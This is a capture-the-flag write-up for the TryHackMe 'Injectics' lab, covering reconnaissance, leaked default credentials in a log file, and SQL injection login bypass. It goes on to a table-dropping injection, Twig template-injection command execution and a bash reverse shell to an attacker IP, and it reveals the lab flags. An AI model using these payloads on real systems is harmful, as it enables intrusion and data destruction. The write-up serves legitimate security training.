#medium 

## 0. **Lab infos**

**Difficulty :** Medium
**Name :** Injectics
**IP** : 10.10.234.174 | 10.10.72.119
**Objectives :** Get the admin panel flag and and the hidden text file flag
**OS :** ?

##### **Conclusion**
**Time :** 
	**Start :** 05.03.2025 / 19:31
	**Break at/to :** 05.03.2025 / 21:11  ||  09.03.2025 / 16:30
	**Finish :** 09.03.2025 / 17:22
**Satisfaction :**  8/10 I use medium for some logics
### 1. **Reconnaissance

Firsto of all, we start with a #nmap scan :

```BASH
nmap -A -p- -v 10.10.234.174
```

Output :

```BASH
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Injectics Leaderboard
```

We can see the port 80 open so its probably a web app.
We also see a server #apache and an Ubuntu so it's a #linux 

We open #burpsuite for analyzing the requests

![[Pasted image 20250305204445.png]]

The site map of #burpsuite show this.

#gobuster show us this result :

```BASH
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.234.174 -x html,php,js,txt,config
```

Output :

```BASH
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 6588]
/login.php            (Status: 200) [Size: 5401]
/mail.log             (Status: 200) [Size: 1098]
/flags                (Status: 301) [Size: 314] [--> http://10.10.234.174/flags/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.234.174/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.234.174/js/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/vendor               (Status: 301) [Size: 315] [--> http://10.10.234.174/vendor/]
/dashboard.php        (Status: 302) [Size: 0] [--> dashboard.php]
/functions.php        (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.10.234.174/phpmyadmin/]
/conn.php             (Status: 200) [Size: 0]
/server-status        (Status: 403) [Size: 278]
```


Go try `mail.log`

```TEXT
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm
```


We have enought informations now. 
## 2. **Weaponization

## 3. **Delivery

## 4. **Exploitation

On the `login.php` page that we discovered we can try an sql injection. 

![[Pasted image 20250305205106.png]]

But it's doesn't work.

So we try on `adminLogin007.php`
Same issue.

The logins of `mail.log` are not working.

With this sql injections list on #github we try to brut force with burp suite 
https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt

![[Pasted image 20250305215532.png]]

![[Pasted image 20250305215818.png]]

![[Pasted image 20250305220016.png]]

`%27%20%4f%52%20%27%78%27%3d%27%78%27%23%3b`

Hehe

To get access to the admin panel for the challenge question, we need to delete the `users` table. So we want to find somewhere to inject: #SQLInjection 

```SQL
drop table users -- -
```

![[Pasted image 20250309165211.png]]

![[Pasted image 20250309165227.png]]

Perfect

Now we just need to log to the admin panel with de credentials we has discovered in `mail.log` #clearTextCredentials 

![[Pasted image 20250309165444.png]]

Hehe

On the `update_profile.php` page we edit the First name to `{{7*7}}` and on the dashboard we can see that : #ssti

![[Pasted image 20250309165729.png]]

So we are probabely on twig and we now have to find the good injection.

There's

```php
{{['id',""]|sort('passthru')}}
```

![[Pasted image 20250309171459.png]]

we are `www-data`
## 5. **Installation

## 6. **Command and Control

We now create a #rce

```BASH
nc -lvnp 4444
```

```php
{{ ['/bin/bash -c "bash -i >& /dev/tcp/10.10.74.179/4444 0>&1"', '']|sort('passthru') }}
```

![[Pasted image 20250309172001.png]]

## 7. **Actions on Objectives

The flag is a hidden text file in the flags folder.

```BASH
www-data@injectics:/var/www/html$ ls
ls
adminLogin007.php
banner.jpg
composer.json
composer.lock
conn.php
css
dashboard.php
edit_leaderboard.php
flags
functions.php
index.php
injecticsService.php
js
login.php
logout.php
mail.log
script.js
styles.css
update_profile.php
vendor
www-data@injectics:/var/www/html$ ls flags
ls flags
5d8af1dc14503c7e4bdc8e51a3469f48.txt
www-data@injectics:/var/www/html$ cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt
<tml$ cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt
THM{5735172b6c147f4dd649872f73e0fdea}
www-data@injectics:/var/www/html$ 
```

There is our flag.

`THM{5735172b6c147f4dd649872f73e0fdea}`